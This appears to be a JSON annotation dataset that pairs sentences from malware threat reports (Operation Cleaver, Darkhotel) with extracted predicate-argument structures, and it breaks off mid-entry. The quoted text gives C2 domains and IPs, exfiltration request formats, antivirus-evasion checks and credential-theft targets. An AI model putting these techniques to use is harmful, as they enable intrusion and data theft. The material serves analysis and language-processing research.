"SOAP", "O": ["a sub-protocol communicated via HTTP"]}}], " Famous\nexamples of these efforts include industrial sabotage via\nStuxnet (2009 - 2010), and espionage with Duqu (2009 - 2011)\nas well as Flame (2012)": [{"include": {"A": "include", "S": "Famous examples of these efforts", "O": ["espionage", "with Duqu (2009 - 2011) as well as Flame (2012)"]}}], " It is likely that SOAP was used because it is simple to\nimplement in C#, and has the added benefit of blending in with other benign HTTP traffic": [{"blending in": {"A": "blending in", "S": "SOAP", "O": ["with other benign HTTP traffic"]}}], "\n</section>\n\n\n\n<footer>45</footer>\n\f\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<section>\n<heading>SMTP</heading>\nEarly Cleaver operations abused SMTP in order to exfiltrate information": [{"abused": {"A": "abused", "S": "Early Cleaver operations", "O": ["in order to exfiltrate information", "SMTP"]}}], " This clever scheme makes sure the\n malware can connect to the command and control server,\n and increases the chances that domain credentials are\n cached on the now infected machine": [{"connect": {"A": "connect", "S": "the malware", "O": ["to the command and control server"]}}], " NetCat has an option when being\ncompiled to enable or disable the ability for NetCat to execute a command after the connection\nis established": [{"execute": {"A": "execute", "S": "NetCat", "O": ["a command", "after the connection is established"]}}], " While the user\n enters this information, their machine is infected with TinyZBot": [{"is infected": {"A": "is infected", "O": ["their machine", "While the user enters this information", "with TinyZBot"]}}], " FTP upload\n support was added, with hardcoded credentials of ano:1": [{"was added": {"A": "was added", "O": ["with hardcoded credentials of ano:1", "FTP upload support"]}}], " The following is the key used for XOR\n encryption:\n<list>\n     Sorry! The handle to file %s is not a valid handle any more.\\nSorry!\n             The handle to file %s is not a valid handle any more": [{"used": {"A": "used", "O": ["the key", "for XOR encryption"]}}], "\n\n  The resulting executable masquerades as the desired software": [{"masquerades": {"A": "masquerades", "S": "The resulting executable", "O": ["as the desired software"]}}], " These versions have the capability to install as a service": [{"install": {"A": "install", "S": "These versions", "O": ["as a service"]}}], " This was likely to avoid detonation-based detection engines": [{"avoid": {"A": "avoid", "S": "This", "O": ["detonation-based detection engines"]}}], " Nesha was seen in breaches involving\n  SQL injection as well as other techniques": [{"was seen": {"A": "was seen", "O": ["in breaches involving SQL injection as well as other techniques", "Nesha"]}}], " In this context, it is the process\n  of stealing information without being detected": [{"is": {"A": "is", "S": "it", "O": ["the process of stealing information without being detected"]}}], "                                                                                              \n\n                                                   \n                                                   \n                                                   \n<figure></figure>                                  \n                                                   \n<caption>Figure 17: Unable to connect to the Internet, the                                  \ntool prompts the user for proxy configuration\ninformation.</caption>                                       \n                                                   \n\n<figure></figure>\n\n\n<caption>Figure 18: Final r\u00e9sum\u00e9 submission form\ndisplays to the user while the malware runs\nfreely in the background.</caption>\n\n</section>\n\n\n<footer>34</footer>\n\f\n<header>#OPCLEAVER</header>\n<section>\n\n  <heading>Teledyne R\u00e9sum\u00e9 Submitter (cont.)</heading>\n\n  The first r\u00e9sum\u00e9 submission form requests contact information": [{"requests": {"A": "requests", "S": "The first r\u00e9sum\u00e9 submission form", "O": ["contact information"]}}], " This dropper impersonated a tool to submit a r\u00e9sum\u00e9 to Teledyne": [{"impersonated": {"A": "impersonated", "S": "This dropper", "O": ["a tool to submit a r\u00e9sum\u00e9 to Teledyne"]}}], " This makes it more difficult to detect that privileged information is being exfiltrated": [{"being exfiltrated": {"A": "being exfiltrated", "O": ["privileged information"]}}], "\n</section>\n<section>\n<heading>Cached Credential Dumping</heading>\nA very common method of pivoting on a predominantly Windows operating system based\nnetwork is to extract domain credentials which have been used on the compromised computer\nfrom a credential cache": [{"extract": {"A": "extract", "O": ["domain credentials which have been used on the compromised computer from a credential cache"]}}], " An update mechanism was added, and could be regularly scheduled,\n so unassisted periodic update checks were automatically performed": [{"were automatically performed": {"A": "were automatically performed", "O": ["unassisted periodic update checks"]}}], " There are a few well-known tools which are capable of doing this given\nsufficient privileges on the infected host": [{"given": {"A": "given", "O": ["a few well-known tools", "sufficient privileges on the infected host"]}}], " A PHP shell was also observed,\n  which also included attribution to Nesha in its hashed password": [{"was also observed": {"A": "was also observed", "O": ["A PHP shell"]}}], "\norg/\u201d /></soap:Body></soap:Envelope>\n\nHTTP/1.1 200 OK\nCache-Control: private, max-age=0\nContent-Type: text/xml; charset=utf-8\nServer: Microsoft-IIS/7.5\nX-AspNet-Version: 2.0.50727\nX-Powered-By: ASP.NET\nDate: Mon, 06 Oct 2014 13:36:47 GMT\nContent-Length: 392\n\n</code>\n</section>\n\n<footer>48</footer>\n\f\n<header>#OPCLEAVER</header>\n<section>\n\n  <heading>TinyZBot Command and Control Protocol (cont.)</heading>\n  <code>\n  <?xml version=\u201d1.0\u201d encoding=\u201dutf-8\u201d?><soap:Envelope\n  xmlns:soap=\u201dhttp://schemas.xmlsoap.org/soap/envelope/\u201d xmlns:xsi=\u201dhttp://www.w3.org/2001/\n  XMLSchema-instance\u201d\n  xmlns:xsd=\u201dhttp://www.w3.org/2001 XMLSchema\u201d><soap:Body><GetServerTimeResponse xmlns=\u201dhttp://\n  tempuri.org/\u201d><GetServerTimeResult>2014-10-06T13:36:47.2193601Z</GetServerTimeResult></\n  GetServerTimeResponse></soap:Body></soap:Envelope>\n</code>\n\n  This is the first query done by a running TinyZBot instance, and needs to be done shortly before\n  most other queries, in order to update the dynamic password": [{"done": {"A": "done", "S": "a running TinyZBot instance", "O": ["the first query"]}}], " The ability to extract Internet Explorer passwords was added": [{"was added": {"A": "was added", "O": ["The ability to extract Internet Explorer passwords"]}}], " As the\n  infected user is going through and filling out all this information, the malware is running in the\n  background, logging their keystrokes, retrieving their stored passwords, etc": [{"retrieving": {"A": "retrieving", "S": "the malware", "O": ["their stored passwords"]}, "logging": {"A": "logging", "S": "the malware", "O": ["their keystrokes"]}}], " The command and control server for this version was located at 173.192.144.68/\n DefaultWS(dot)asmx": [{"was located": {"A": "was located", "O": ["The command and control server for this version", "at 173.192.144.68/ DefaultWS(dot)asmx"]}}], "\n</section>\n\n\n\n<footer>40</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>MS08-067 Exploit</heading>\n\n  MS08-067 is a vulnerability in Microsoft Windows made popular by the Conficker worm which can\n  be exploited by a specially crafted packet to the operating system\u2019s RPC network interface": [{"is": {"A": "is", "S": "MS08-067", "O": ["a vulnerability in Microsoft Windows made popular by the Conficker worm which can be exploited by a specially crafted packet to the operating system\u2019s RPC network interface"]}}], " The\n  RUNCMD line requests that cmd.exe be executed, with the command ipconfig /all being\n  redirected to a file in a directory designated for files to be uploaded": [{"be executed": {"A": "be executed", "O": ["cmd.exe"]}}], " Nesha often utilized web-based backdoors developed\n  in ASPX, PHP as well as ColdFusion": [{"utilized": {"A": "utilized", "S": "Nesha", "O": ["web-based backdoors developed in ASPX, PHP as well as ColdFusion"]}}], "\nNext the module makes sure only one instance of current code is running by\nchecking if system mutex object named \u00ab920111215\u00bb exists": [{"makes sure": {"A": "makes sure", "S": "the module", "O": ["only one instance of current code is running", "by checking if system mutex object named \u00ab920111215\u00bb exists"]}}], "\n</section>\n\n<section>\n<heading>Information Stealer</heading>\n<table>\nFilename      MD5                                  Link Time (UTC)           Linker\n\nDmaUp3.exe 864cd4a59215a7db2740dfbe4a648053 2012.04.30                       6.0\n                                                   00:25:59\n</table>\nThis module is relatively large (455Kb) and comes as a part of WinRar SFX file\nthat drops and starts the module from %APPDATA%\\Microsoft\\Display\\DmaUp3": [{"starts": {"A": "starts", "S": "WinRar SFX file", "O": ["from %APPDATA%\\Microsoft\\Display\\DmaUp3. exe"]}, "drops": {"A": "drops", "S": "WinRar SFX file"}}], " Here is an example of shortest possible valid server response:\n<list>\n    HTTP/1.1 200 OK\n    Content\u00adLength: 17\n    DEXT87192.168.1.1\n</list>\n2.\t If the real C&C IP address is not valid the module may try to send identical\n    request again but using a different HTTP path: <list>/major/images/read.php</list>\n    If the C&C IP address is valid, the module issues another HTTP request:\n<list>\n    GET /major/txt/read.php HTTP/1.1\n    User\u00adAgent: Mozilla/4.0 (compatible\u037e MSIE 8.0\u037e Windows NT 6.1\u037e Trident/4.0\u037e\n    SLCC2\u037e\n    .NET CLR 2.0.50727\u037e .NET CLR 3.5.30729\u037e .NET CLR 3.0.30729\u037e Media Cen-\n    ter PC 6.0)\n    Host: autolace.twilightparadox.com\n    Connection: Keep\u00adAlive\n    Cache\u00adControl: no\u00adcache\n</list>\n    The server response can be one of the following:\n<list>\n   a": [{"send": {"A": "send", "S": "the module", "O": ["using a different HTTP path", "again", "identical request"]}}, {"issues": {"A": "issues", "S": "the module", "O": ["another HTTP request"]}}], " So far, the attackers can steal logins and pass-\nwords but to understand where they are from they must guess the string which\nproduced given hash": [{"steal": {"A": "steal", "S": "the attackers", "O": ["logins and pass- words"]}}], "\nThis smaller code section maintains similar functionality to the \u201cworm\u201d compo-\nnent:\n<list>\n\u2022\t B\t ASICAPI window creation and update\n\u2022\t \tVMWare detection/red pill\n\u2022\t \tAV check\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>68</header>\n\n\n\u2022\t dmaup3.exe checks\n\u2022\t proto.dat check\n\u2022\t system information collection, encryption with\n      \u00abab911001f78ad31552e47205ecc46466\u00bb key and transfer to c2\n</list>\nHost package files detected as \u201cVirus.Win32.Pioneer.dx\u201d are infected legitimate\nfiles, that do not have any self\u00adpropagation routines": [{"are": {"A": "are", "S": "Host package files detected as \u201cVirus.Win32.Pioneer.dx\u201d", "O": ["infected legitimate files"]}}], " The debug path inside:\n<list>\n d:\\KerKey\\KerKey(\uc77c\ubc18)\\KerKey\\release\\KerKey.pdb\nNote \u00ad\uc77c\ubc18 \u00admeans \u201cGeneral\u201d in Korean\n</list>\nThe dropper above maintains, drops and installs this kernel mode keylogger:\n<list>\nmd5: 86b18e99072ba72d5d36bce9a00fc052 filename: ndiskpro.sys\nsize: 295kb\nCompiledOn:2009\u00ad11\u00ad24 11:56:22\n</list>\nLikely, it was developed as a part of a mid\u00adto\u00adlate 2009 project:\n<list>\n e:\\project\\2009\\x\\total_source\\32bit\\ndiskpro\\src\\ioman.c\n</list>\n</section>\n\n<section>\n<heading>Keylogger Code</heading>\nThis driver package is built to look like a legitimate low level Microsoft system\ndevice": [{"maintains, drops and installs": {"A": "maintains, drops and installs", "S": "The dropper above", "O": ["this kernel mode keylogger"]}}], " It is somewhat surprising that there is no rootkit\nfunctionality hiding this service:\n\n\n\n<footer>\nTLP: Green\t                 For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                 \n<header>69</header>\n\n<figure></figure>\n\n\nWhen loaded, the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff, and\nretrieves keystroke data directly from port 0x60, the motherboard keyboard con-\ntroller itself": [{"hooks": {"A": "hooks", "S": "the NDISKPRO.SYS driver", "O": ["both INT 0x01 and INT 0xff"]}, "retrieves": {"A": "retrieves", "S": "the NDISKPRO.SYS driver", "O": ["directly from port 0x60, the motherboard keyboard con- troller itself", "keystroke data"]}}, {"loaded": {"A": "loaded", "O": ["the NDISKPRO.SYS driver"]}}], " Another method to detect VM en-\nvironment is to check local network adapter\u2019s IP address": [{"detect": {"A": "detect", "S": "Another method", "O": ["VM en- vironment"]}}, {"check": {"A": "check", "O": ["local network adapter\u2019s IP address"]}}], " Then the module attempts to delete some other, prob-\nably older, components which might be present on the system": [{"delete": {"A": "delete", "S": "the module", "O": ["some other, prob- ably older, components which might be present on the system"]}}], " The\nrunning process overwrites the igfxext.exe image in the suspended process with\nthis smaller chunk of code": [{"overwrites": {"A": "overwrites", "S": "The running process", "O": ["the igfxext.exe image", "with this smaller chunk of code", "in the suspended process"]}}], " First, it checks if cur-\nrent process is running in WOW64 environment": [{"checks": {"A": "checks", "S": "it", "O": ["if cur- rent process is running in WOW64 environment"]}}], " A quote from Wikipedia:\n\u00abBorn in Yokohama Chinatown, Japan (though she is of partial Chinese descent)\nas Linn Minmei, Minmay moved in with her uncle Shaochin (\u5c11\u6c5f) and aunt Feic-\nhun (\u6167\u4e2d) on South Ataria Island in hopes of finding the path to fulfill her dream\nof becoming a star.\u00bb\n</section>\n\n<section>\n<heading>Trojan.Win32.Karba.e</heading>\n<table>\nFilename       MD5                                 Link Time (UTC)          Linker\n\nacroedit.exe   0fe3daf9e8b69255e592c8af97d24649    2013.10.29 00:21:48      6.0\n</table>\n</section>\n\n<section>\n<heading>Technical Notes</heading>\nThe trojan iterates through running processes and looks for security software\nbasing on executable filenames from the list below": [{"iterates": {"A": "iterates", "S": "The trojan", "O": ["through running processes"]}, "looks": {"A": "looks", "S": "The trojan", "O": ["for security software basing on executable filenames from the list below"]}}], " After\nexecution, the downloaded file drops SMAGENT.EXE (md5 0306f9ae-\n7786570139f78e78bc940597) to %APPDATA%\\MICROSOFT\\DISPLAY and ex-\necutes it": [{"drops": {"A": "drops", "S": "the downloaded file", "O": ["SMAGENT.EXE (md5 0306f9ae- 7786570139f78e78bc940597)", "to %APPDATA%\\MICROSOFT\\DISPLAY"]}, "ex- ecutes": {"A": "ex- ecutes", "S": "the downloaded file", "O": ["it"]}}], " Malcode Technical Notes</heading>\n</section>\n<section>\n<heading>Small Downloader</heading>\n<table>\nFilename      MD5                                 Link Time (UTC)           Linker\n\nmsieckc.exe   41b816289a6a639f7f2a72b6c9e6a695    2012.04.11 18:31:48       6.0\n</table>\n</section>\n<section>\n<heading>Technical Details</heading>\nTo ensure only single instance of the module is running, the module verifies if\nsystem mutex named \u00ab132DF6E\u00bb exists": [{"ensure": {"A": "ensure", "S": "the module", "O": ["only single instance of the module is running"]}}], "\nNext the malware submits collected information to the C&C server using HTTP\nGET request and the following URL format: http://<C2DOMAIN>/bin/read_i.php\n\n\n\n<footer>\nTLP: Green\t              For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>66</header>\n\n\n?a1=%STEPID%&a2=%HOSTID%&a3=%SYSINFO%&a4=% AVSOFTID%, where\n%C2DOMAIN% is one of the following C&C domains:\n<list>\n\u2022\t \tmicronaoko.jumpingcrab.com\n\u2022\t \tmicrochsse.strangled.net\n\u2022\t \tmicrobrownys.strangled.net\n\u2022\t \tmicroplants.strangled.net\n\u2022\t \tmicrolilics.crabdance.com\n</list>\n%STEPID% is special text string indicating stage of malware operation": [{"submits": {"A": "submits", "S": "the malware", "O": ["collected information", "using HTTP GET request and the following URL format: http://<C2DOMAIN>/bin/read_i.php ?a1=%STEPID%&a2=%HOSTID%&a3=%SYSINFO%&a4=% AVSOFTID%, where %C2DOMAIN% is one of the following C&C domains", "to the C&C server"]}}], " These files are all legitimate files that have been infected by another\nDarkhotel component": [{"been infected": {"A": "been infected", "S": "another Darkhotel component", "O": ["These files"]}}], "\n</section>\n\n<section>\n<heading>Technical Details</heading>\nFrom the very beginning this module checks if \u00abbdagent.exe\u00bb process is running\non current system": [{"checks": {"A": "checks", "S": "this module", "O": ["if \u00abbdagent.exe\u00bb process is running on current system"]}}], " It drops\na keylogger": [{"drops": {"A": "drops", "S": "It", "O": ["a keylogger"]}}], " This file is located in the same\ndirectory as the original dropper, which maintains persistence across reboots with\na simple addition to the HKCU run key": [{"maintains": {"A": "maintains", "S": "the original dropper", "O": ["with a simple addition to the HKCU run key", "persistence", "across reboots"]}}], " It is logging all actions to inform the operator what exactly was\nexecuted by this variant of the malware": [{"is logging": {"A": "is logging", "S": "It", "O": ["all actions", "to inform the operator what exactly was executed by this variant of the malware"]}}], " After that, the mod-\nule collects information about current system which includes the following:\n<list>\n\u2022\t   \tNetwork adapter MAC address\n\u2022\t   \tCPU Name and Identifier\n\u2022\t   \tSystem default codepage\n\u2022\t   \tWindows OS and Service Pack versions\n\u2022\t    \tHostname and IP address\n\u2022\t     \tLocal user name\n\u2022\t      \tCached passwords from Internet Explorer 6/7/8/9 (Protected Storage and\n        IntelliForms)\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                  \n<header>61</header>\n\n\n\u2022\t Mozilla Firefox stored secrets (<12.0)\n\u2022\t Chrome stored secrets\n\u2022\t MS Outlook Express accounts\n\u2022\t MS Windows Mail accounts\n\u2022\t MS Windows Live Mail accounts\n\u2022\t MS Outlook accounts (SMTP/IMAP/POP3/HTTP)\n\u2022\t MSN Messenger\n\u2022\t Gmail Notifier credentials\n\u2022\t Google Desktop accounts\n\u2022\t Google Talk accounts\n</list>\nIf the module reveals that current System default codepage is 0412 (Korean) it\nterminates": [{"collects": {"A": "collects", "S": "the mod- ule", "O": ["information about current system which includes the following"]}}], "\n</section>\n\n<section>\n<heading>Selective Infector</heading>\n</section>\n<section>\n<heading>Technical Notes</heading>\nIgfxext.exe can download a file and drop it to %APPDATA%\\microsoft\\dis-\nplay\\ctfmon.exe (md5= e8bfb82b0dd5cef46116d61f62c25060)": [{"download": {"A": "download", "S": "Igfxext.exe", "O": ["a file"]}, "drop": {"A": "drop", "S": "Igfxext.exe", "O": ["it", "to %APPDATA%\\microsoft\\dis- play\\ctfmon.exe (md5= e8bfb82b0dd5cef46116d61f62c25060)"]}}], " The igfxext.exe component is dropped to disk and run": [{"run": {"A": "run", "O": ["The igfxext.exe component"]}, "is dropped": {"A": "is dropped", "O": ["The igfxext.exe component", "to disk"]}}], " This component is a virus, and is used to selectively infiltrate into other\ncomputers via USB or network shares": [{"infiltrate": {"A": "infiltrate", "S": "This component", "O": ["via network shares"]}}], " Please note, that after receiving <DATA>, it is XORed with byte\n     value 0x55 and saved to a disk in a file named \u00abctfmon.exe\u00bb (current directory\n     is used)": [{"saved": {"A": "saved", "O": ["it", "in a file named \u00abctfmon.exe\u00bb", "to a disk"]}, "is XORed": {"A": "is XORed", "O": ["it", "with byte value 0x55"]}}], "\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>64</header>\n\n\nThe malware uses fixed User\u00adAgent string:\n<list>\nMozilla/4.0 (compatible\u037e MSIE 8.0\u037e Windows NT 6.1\u037e Trident/4.0\u037e SLCC2\u037e\n.NET\u00a0CLR 2.0.50727\u037e .NET CLR 3.5.30729\u037e .NET CLR 3.0.30729\u037e Media Cen-\nter PC 6.0)\n</list>\nThe data is uploaded as a POST request binary in the following format:\n<list>\n<UserId>\u037e<UniqueMachineId>\u037e<EncryptionKey>\u037e<GeneralSysInfo>\n</list>\nwhere <UserId> is hardcoded identifier (i.e": [{"is uploaded": {"A": "is uploaded", "O": ["as a POST request binary", "The data", "in the following format"]}}], " Right after\nthat keystroke generation thread is terminated and the module continues normal\nexecution as if \u00abbdagent.exe\u00bb was not running": [{"is terminated": {"A": "is terminated", "O": ["keystroke generation thread"]}}], " It gets\nCPU name and identifier from the registry at HKLM\\HARDWARE\\DESCRIPTION\\\nSystem\\CentralProcessor\\0\nand collects IP and MAC addresses of local network adapters": [{"gets": {"A": "gets", "S": "It", "O": ["from the registry at HKLM\\HARDWARE\\DESCRIPTION\\ System\\CentralProcessor\\0", "CPU name and identifier"]}, "collects": {"A": "collects", "S": "It", "O": ["IP and MAC addresses of local network adapters"]}}], "\nAfter stealing secrets from local system the malware executes some kind of\nembedded script": [{"executes": {"A": "executes", "S": "the malware", "O": ["some kind of embedded script"]}, "stealing": {"A": "stealing", "S": "the malware", "O": ["secrets", "from local system"]}}], "\nThe module uploads all collected information to one of the following URLs via\nPOST request:\n<list>\n\u2022\t hxxp://fenraw.northgeremy.info/html/docu.php\n\u2022\t hxxp://fenrmi.eu.pn/html/docu.php\t\n\u2022\t hxxp://fenrix.yaahosting.info/html/docu.php\t\n\u2022\t hxxp://fenry.zoka.cc/html/docu.php\t\n</list>\nIt\u2019s the first time we see .pn domain used in malware": [{"uploads": {"A": "uploads", "S": "The module", "O": ["all collected information", "to one of the following URLs", "via POST request"]}}], "\nThis keylogger module encrypts and stores gathered data in a log file, as men-\ntioned previously": [{"stores": {"A": "stores", "S": "This keylogger module"}, "encrypts": {"A": "encrypts", "S": "This keylogger module"}}], "\n    servequake.com) and issues a HTTP GET request with hardcoded User\u00adAgent\n    string:\n<list>\n    GET /major/images/view.php HTTP/1.1\n    User\u00adAgent: Mozilla/4.0 (compatible\u037e MSIE 8.0\u037e Windows NT 6.1\u037e Trident/4.0\u037e\n    SLCC2\u037e .NET CLR 2.0.50727\u037e .NET CLR 3.5.30729\u037e .NET CLR 3.0.30729\u037e\n    Media Center PC 6.0)\n    Host: autolace.twilightparadox.com\n    Connection: Keep\u00adAlive\n    Cache\u00adControl: no\u00adcache\n</list>\n    The server response should contain \u00abDEXT87\u00bb string which is used to rec-\n    ognize valid response": [{"issues": {"A": "issues", "S": "The module", "O": ["with hardcoded User\u00adAgent string", "a HTTP GET request"]}, "connects": {"A": "connects", "S": "The module", "O": ["to autolace.twilightparadox.com (or automachine. servequake.com)"]}}, {"is used": {"A": "is used", "O": ["to rec- ognize valid response", "\u00abDEXT87\u00bb string"]}}], "\n</list>\nThis sample is started by code running within svchost.exe on WinXP SP3": [{"is started": {"A": "is started", "S": "code running within svchost.exe on WinXP SP3", "O": ["This sample"]}}], " If the process is found it\nkeeps a record of the software name using short AV Identifier string from the fol-\nlowing table of rules\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                 \n<header>65</header>\n\n<table>\nProcess Name               AV Identifier                Company Name, Country\n\nekrn.exe                   NOD                          ESET, Czech Republic\n\nNVCAgent.npc               NV                           Naver NHN, Vietnam\n\n360tray.exe                36                           Qihoo 360, China\n\nmsseces.exe                MS                           Microsoft, USA\n\nuiWinMgr.exe               TR                           TrendMicro, Japan\n\nAvastSvc.exe               AST                          Avast, Czech Republic\n\nRsMgrSvr.exe               RS                           Rising, China\n\nmcagent.exe                MC                           McAfee, USA\n\navgidsagent.exe            AV                           AVG, Czech Republic\n\nccsvchst.exe               NT                           Symantec, USA\n\nbdagent.exe                BD                           BitDefender, Romania\n\navp.exe                    KS                           Kaspersky, Russia\n\nV3LTray.exe                V                            AhnLab, South Korea\n\nAYAgent.aye                AY                           ESTSoft, South Korea\n</table>\nThe malware uses a trick to evade running on a VMware": [{"evade": {"A": "evade", "S": "The malware", "O": ["running on a VMware"]}}], " Here is the list of\nURLs that are checked by the malware:\n<list>\n\u2022\thttp://twitter.com\n\u2022\thttp://facebook.coom\n\u2022\thttp://passport.yandex.ru/passport\n\u2022\thttp://yandex.ru\n\u2022\thttp://qip.ru\n\u2022\thttp://mail.qip.ru\n\u2022\thttps://login.nifty.com/service/login\n\u2022\thttp://e.mail.ru/cgibin/login\n\u2022\thttp://mail.ru\n\u2022\thttp://mail.126.com\n\u2022\thttp://secure.zapak.com/mail/zapakmail.php\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>62</header>\n\n\n\u2022\thttps://lavabit.com/apps/webmail/src/login.php\n\u2022\thttp://www.bigstring.com\n\u2022\thttp://www.gmx.com\n\u2022\thttp://passport.sohu.com/indexaction.action\n\u2022\thttp://www.sohu.com\n\u2022\thttps://www.zoho.com/login.html\n\u2022\thttp://mail.sina.com.cn\n\u2022\thttp://members.sina.com/index.php\n\u2022\thttp://www.care2.com/passport/login.html\n\u2022\thttp://www.mail.com/int\n\u2022\thttps://fastmail.fm/mail\n\u2022\thttps://www.inbox.com/login.aspx\n\u2022\thttp://www.gawab.com\n\u2022\thttp://mail.163.com\n\u2022\thttp://registration.lycos.com/login.php\n\u2022\thttp://mail.lycos.com\n\u2022\thttps://my.screenname.aol.com/_cqr/login/login.psp\n\u2022\thttps://edit.bjs.yahoo.com/config/login\n\u2022\thttps://login.yahoo.co.jp/config/login\n\u2022\thttps://login.yahoo.com/config/login_verify2\n\u2022\thttps://login.live.com/login.srf\n\u2022\thttps://www.google.com/accounts/servicelogin\n</list>\nThe list of targeted services includes some local services specifically popular in:\n<list>\n\u2022\t \tUnited States\n\u2022\t \tRussia\n\u2022\t \tChina\n\u2022\t \tJapan\n\u2022\t \tMiddle Eastern countries\n\u2022\t \tIndia\n</list>\nThe module uses several simple XOR\u00adbased algorithms to encrypt embedded\nstring data": [{"uses": {"A": "uses", "S": "The module", "O": ["several simple XOR\u00adbased algorithms", "to encrypt embedded string data"]}}], " In addition it\nmakes use of the following Mozilla Firefox libraries depending on Firefox version:\n<list>\n\u2022\t \tnss3.dll\n\u2022\t \tplc4.dll\n\u2022\t \tmozcrt19.dll\n\u2022\t \tmozutils.dll\n\u2022\t \tmozglue.dll\n\u2022\t \tmozsqlite3.dll\n\u2022\t \tsqlite3.dll\n\u2022\t \tnspr4.dll\n\u2022\t \tplds4.dll\n\u2022\t \tnssutil3.dll\n\u2022\t \tsoftokn3.dll\n</list>\nWhen stealing secrets from Firefox and Chrome it uses built\u00adin SQLite library code": [{"stealing": {"A": "stealing", "S": "it", "O": ["from Firefox and Chrome", "secrets"]}}], " It is installed as a system kernel driver \u201cNdiskpro\u201d service, described as\na \u201cMicrocode Update Device\u201d": [{"is installed": {"A": "is installed", "O": ["as a system kernel driver \u201cNdiskpro\u201d service", "It"]}}], "\nIf it is running, it uses simple AV heuristics evasion technique": [{"uses": {"A": "uses", "S": "it", "O": ["simple AV heuristics evasion technique"]}}], " The result of this execution is appended\nto the stolen data and uploaded to the C&C server": [{"uploaded": {"A": "uploaded", "O": ["to the C&C server", "The result of this execution"]}}], "\n<GeneralSysInfo> field contains only basic information about the system, i.e.:\n<list>\nInfo\u037e\nSys@User : MYCOMPUTER@MyUser (0850)\nC P U : Intel(R) Core(TM) i3\u00ad1667U CPU @ 1600GHz\nSystem OS: Microsoft Windows XP (Service Pack 3)\nNet card : 192.168.0.2 (133773311337)\n</list>\nIf the server reply contains a keyword \u00abminmei\u00bb it continues sending additional in-\nformation": [{"sending": {"A": "sending", "S": "it", "O": ["additional in- formation"]}}], "\nThis component then encrypts and writes the retrieved values ondisk to a ran-\n\n\n<footer>\nTLP: Green\t              For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>70</header>\n\n\ndomly named .tmp, file like ffffz07131101.tmp": [{"encrypts": {"A": "encrypts", "S": "This component"}, "writes": {"A": "writes", "S": "This component", "O": ["to a ran- domly named .tmp, file like ffffz07131101.tmp"]}}], " It spawns an-\nother suspended process with its own igfxext.exe image, but decrypts a smaller\n32kb executable (cf1319d94f33380622ba000b7d8ad6e9,Trojan\u00adDownloader": [{"spawns": {"A": "spawns", "S": "It", "O": ["an- other suspended process", "with its own igfxext.exe image"]}}], " If VM is detected\nthe process instantly terminates": [{"terminates": {"A": "terminates", "S": "the process", "O": ["If VM is detected"]}}], " The list of deleted\nfiles includes the following:\n<list>\n\u2022\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\dtlcntr.exe\n\u2022\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\googletoolbar.exe\n\u2022\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\active.dll\n\u2022\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\detect.dll\n</list>\nThe next is step is to check if current directory has a file named \u00abU\u00bb": [{"check": {"A": "check", "O": ["if current directory has a file named \u00abU\u00bb"]}}], " When\nIntelliForms information is stolen the malware tries to check the list of known\nlogin page URLs to recover the originating webpage address": [{"is stolen": {"A": "is stolen", "O": ["IntelliForms information"]}}], " All of these infected files drop a 63kb self injecting compo-\nnent": [{"drop": {"A": "drop", "S": "All of these infected files", "O": ["a 63kb self injecting compo- nent"]}}], " The main purpose of the module is to collect various secrets stored on a\nlocal system": [{"collect": {"A": "collect", "S": "the module", "O": ["various secrets stored on a local system"]}}], " If not, it triggers a special variable that makes module dormant and dis-\nables further communication with C&C server": [{"makes": {"A": "makes", "S": "a special variable", "O": ["dormant", "module"]}}], "\nThe module implements a method to resist running in virtual environment": [{"implements": {"A": "implements", "S": "The module", "O": ["to resist running in virtual environment", "a method"]}}], " The code starts a\nthread that simulates keystrokes of ESC keyboard key and then shows a system\nmodal message box": [{"starts": {"A": "starts", "S": "The code", "O": ["a thread that simulates keystrokes of ESC keyboard key and then shows a system modal message box"]}}], " If \u00abU\u00bb file is older than 180 days, the module wipes\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                  \n<header>59</header>\n\n\nthe file": [{"wipes": {"A": "wipes", "S": "the module", "O": ["the file"]}}], " Every infected file has functionality described in\nTrojan\u00adDropper & Injector section, so it can collect information about the comput-\ner, send it to the C2 and download other Darkhotel components as commanded": [{"has": {"A": "has", "S": "Every infected file", "O": ["functionality described in Trojan\u00adDropper & Injector section"]}}, {"download": {"A": "download", "S": "it", "O": ["other Darkhotel components"]}, "send": {"A": "send", "S": "it", "O": ["it", "to the C2"]}, "collect": {"A": "collect", "S": "it", "O": ["information about the comput- er"]}}], " The module adds autorun registry\nsettings to enable an automatic start during system boot": [{"adds": {"A": "adds", "S": "The module", "O": ["autorun registry settings", "to enable an automatic start during system boot"]}}], " These weak encryption keys, when broken, could\nallow an attacker to use the certificates fraudulently to spoof content, perform\nphishing attacks, or perform man\u00adin\u00adthe\u00admiddle attacks against all Web browser\nusers including users of Internet Explorer": [{"use": {"A": "use", "S": "an attacker", "O": ["to perform man\u00adin\u00adthe\u00admiddle attacks against all Web browser users including users of Internet Explorer"]}}], " The\nactor\u2019s offensive activity can be tied to specific hotel and business center Wi\u2011Fi\nand physical connections, some of it is also tied to p2p/file sharing networks,\nand they have been known to spear-phish targets as well": [{"spear-phish": {"A": "spear-phish", "S": "they", "O": ["targets"]}}], "\nThis keylogger is dropped by code running within svchost.exe on WinXP SP3,\nwhich maintains an interesting debug string:\n<list>\nd:\\KerKey\\KerKey(\uc77c\ubc18)\\KerKey\\release\\KerKey.pdb\nNote 